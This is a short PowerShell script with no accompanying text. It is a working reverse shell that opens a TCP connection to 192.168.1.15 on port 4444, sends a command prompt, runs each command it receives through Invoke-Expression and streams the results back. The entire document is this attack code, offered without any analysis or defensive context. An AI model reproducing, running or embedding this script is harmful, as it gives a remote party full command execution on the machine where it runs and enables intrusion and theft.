$c = New-Object System.Net.Sockets.TCPClient('192.168.1.15', 4444)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
$m = ([text.encoding]::ASCII).GetBytes("CONNECTED`nPS " + (pwd).Path + "> ")
$s.Write($m,0,$m.Length)
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i)
    try { $sb = (IEX $d 2>&1 | Out-String) } catch { $sb = $_.Exception.Message }
    $out = $sb + "PS " + (pwd).Path + "> "
    $m = ([text.encoding]::ASCII).GetBytes($out)
    $s.Write($m,0,$m.Length)
    $s.Flush()
}
$c.Close()
